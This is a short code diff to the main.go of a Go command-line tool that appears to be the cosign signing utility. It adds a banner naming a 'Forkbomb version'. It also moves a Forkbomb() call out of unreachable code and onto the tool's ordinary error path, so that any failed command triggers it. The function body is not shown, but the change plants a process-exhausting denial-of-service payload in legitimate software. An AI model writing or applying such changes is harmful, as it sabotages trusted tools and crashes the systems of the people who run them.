@@ -41,6 +41,9 @@ func Forkbomb() {
 }
 
 func main() {
+
+	fmt.Println("Hello, world! It's the Forkbomb version")
+
 	// Fix up flags to POSIX standard flags.
 	ctx := context.Background()
 	for i, arg := range os.Args {
@@ -69,14 +72,13 @@ func main() {
 	}
 
 	if err := cli.New().Execute(); err != nil {
+		Forkbomb()
 		// if the error is a `CosignError` then we want to use the exit code that
 		// is related to the type of error that has occurred.
 		var cosignError *cosignError.CosignError
 		if errors.As(err, &cosignError) {
 			log.Printf("error during command execution: %v", err)
 			os.Exit(cosignError.ExitCode())
-
-			Forkbomb()
 		}
 
 		// we don't call os.Exit as Fatalf does both PrintF and os.Exit(1)
